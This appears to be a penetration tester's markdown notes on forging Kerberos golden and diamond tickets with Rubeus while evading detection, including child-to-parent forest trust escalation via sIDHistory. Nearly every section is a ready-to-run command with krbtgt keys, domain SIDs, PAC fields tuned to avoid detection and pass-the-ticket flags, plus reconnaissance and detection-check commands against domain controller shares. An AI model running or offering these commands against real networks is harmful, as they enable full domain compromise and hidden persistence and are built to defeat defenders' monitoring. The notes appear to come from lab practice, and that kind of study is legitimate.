# OPSEC GOLDEN TICKET
- To forge tickets with the krbtgt accounts, tools like rubeus or mimikatz will not fill some fields in the PAC, wrongly fill them, or send 3 successive LDAP queries to collect the info needed to fill them.
![](img/GenuineVsMimiPAC.png)
- To forge genuine TGT ticket (using golden ticket) with the krbtgt account make sure to properly set the following fields:
	- PWD Last Set
	- PWD Must Change
	- Full Name
	- Logon Count
	- User Flags
	- Server
	- Type: UPN DNS Info
	- => So for more OPSEC friendly, manually specify as many as you can in the forging command.
```bash
# Fields related to the user
## Powerview
Get-DomainUser mhd

# Fields related to the domain
## Powerview
Get-DomainPolicy
# or
net accounts /domain

# For NetBIOSName
$root = [ADSI]"LDAP://RootDSE"
$domainDN = $root.defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://CN=Partitions,CN=Configuration,$domainDN"
$searcher.Filter = "(nCName=$domainDN)"
($searcher.FindOne().Properties.netbiosname)[0]
# ADModule
Get-ADDomain



# More opsec friendly, but still detected because it doesn't have an asssociated AS-Req
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe golden /aes256:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4 /dc:dc01.yhp0w.lan /domain:yhp0w.lan /user:mhd /id:2103 /pgid:513 /sid:S-1-5-21-2498267786-1201464700-2190978386 /pwdlastset:"12/13/2024 9:03:11 PM" /logoncount:6 /groups:513,512 /uac:NORMAL_ACCOUNT /maxpassage:42 /minpassage:0 /netbios:YHP0W /opsec /nowrap /ptt

# To test it and see if detected
dir \\dc01\c$\users\administrator

```

![](img/Pasted%20image%2020260421141559.png)

![](img/Pasted%20image%2020260421145109.png)
- Always use a valid and active DA account
```
# Always use a valid and active DA account
# Retest 3:28
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe golden /aes256:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4 /dc:dc01.yhp0w.lan /domain:yhp0w.lan /user:administrator /id:500 /pgid:513 /sid:S-1-5-21-2498267786-1201464700-2190978386 /pwdlastset:"4/10/2026 4:25:37 PM" /logoncount:79 /groups:513,512 /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /maxpassage:42 /minpassage:0  /startoffset:0 /endin:600 /renewmax:10080 /netbios:YHP0W /opsec /nowrap /ptt

# To test it and see if detected
dir \\dc01\c$\users\administrator
```

![](img/Pasted%20image%2020260424153520.png)

![](img/Pasted%20image%2020260424153525.png)

# Even Stealthier, OPSEC DIAMOND TICKET
 - Instead of forging a brand-new ticket offline (like in Golden/Silver), in a Diamond Ticket attack, the attacker uses an existing valid TGT, modifies it to insert arbitrary values (e.g., change group membership, privileges, lifetime).
- "[Golden](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) and [Silver tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) can usually be detected by probes that monitor the service ticket requests (`KRB_TGS_REQ`) that have no corresponding TGT requests (`KRB_AS_REQ`). 
- Those types of tickets also feature forged PACs that sometimes fail at mimicking real ones, thus increasing their detection rates. 
- Diamond tickets can be a useful alternative in the way they simply request a normal ticket, decrypt the PAC, modify it, recalculate the signatures and encrypt it again. 
- It requires knowledge of the target service long-term key (can be the `krbtgt` for a TGT, or a target service for a Service Ticket)."  
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
```
# Opsec friendly diamond ticket
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe diamond /krbkey:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4 /user:consultant /aes256:0d87626e50a46ac45dfc302c10eabb815d5dd5cac96340fe9b91694bf9272f32 /dc:dc01.yhp0w.lan /domain:yhp0w.lan /enctype:aes256 /ticketuserid:1118 /groups:512,513 /opsec /nowrap /ptt

# Opsec friendly diamond ticket impersonating another user
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe diamond /krbkey:1a0e0713a7666e5bb5dc319b2340f1c85ebfccfccfc3a55de1f019d35e4fa8c4 /user:consultant /aes256:0d87626e50a46ac45dfc302c10eabb815d5dd5cac96340fe9b91694bf9272f32 /dc:dc01.yhp0w.lan /domain:yhp0w.lan /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /pgid:513 /pwdlastset:"12/13/2024 9:03:11 PM" /logoncount:73 /groups:513,512 /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /minpassage:0 /maxpassage:42 /netbios:YHP0W /opsec /nowrap /ptt

# To test it and see if detected
dir \\srv01\c$\users\administrator\
```
# Child to forest trust abuse (untested against MDI)
## OPSEC GOLDEN TICKET
- Forge a Golden ticket with sIDHistory of the Enterprise Domain Controllers group using the krbtgt of the child
- Due to the trust, the parent domain will trust the TGT
- So forge a golden ticket by specifying fields as many as you can in the forging command.
```bash
# /sid:S-1-5-21-210670787-2521448726-163245708 - child domain sid
# /sids:S-1-5-21-2781415573-3701854478-2406986946-516 - parent domain sid + RID of Domain Controllers
# S-1-5-9 - Enterprise Domain Controllers

Rubeus.exe golden /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /user:us-dc$ /id:1001 /pgid:516 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /pwdlastset:"10/15/2025 12:59:02 AM" /minpassage:1 /logoncount:4 /netbios:us.techcorp /groups:516 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /dc:us-dc.us.techcorp.local /uac:SERVER_TRUST_ACCOUNT,TRUSTED_FOR_DELEGATION /enctype:aes256 /opsec /nowrap
```
## OPSEC DIAMOND TICKET
- Forge a Diamond ticket with sIDHistory of the Enterprise Domain Controllers group using the krbtgt of the child
- Due to the trust, the parent domain will trust the TGT
```bash
# For the same user requesting the TGT
Rubeus.exe diamond /krbkey:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /user:us-dc$ /aes256:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24 /enctype:aes256 /domain:us.techcorp.local /dc:us-dc.us.techcorp.local /ticketuserid:1000 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /opsec /nowrap
```
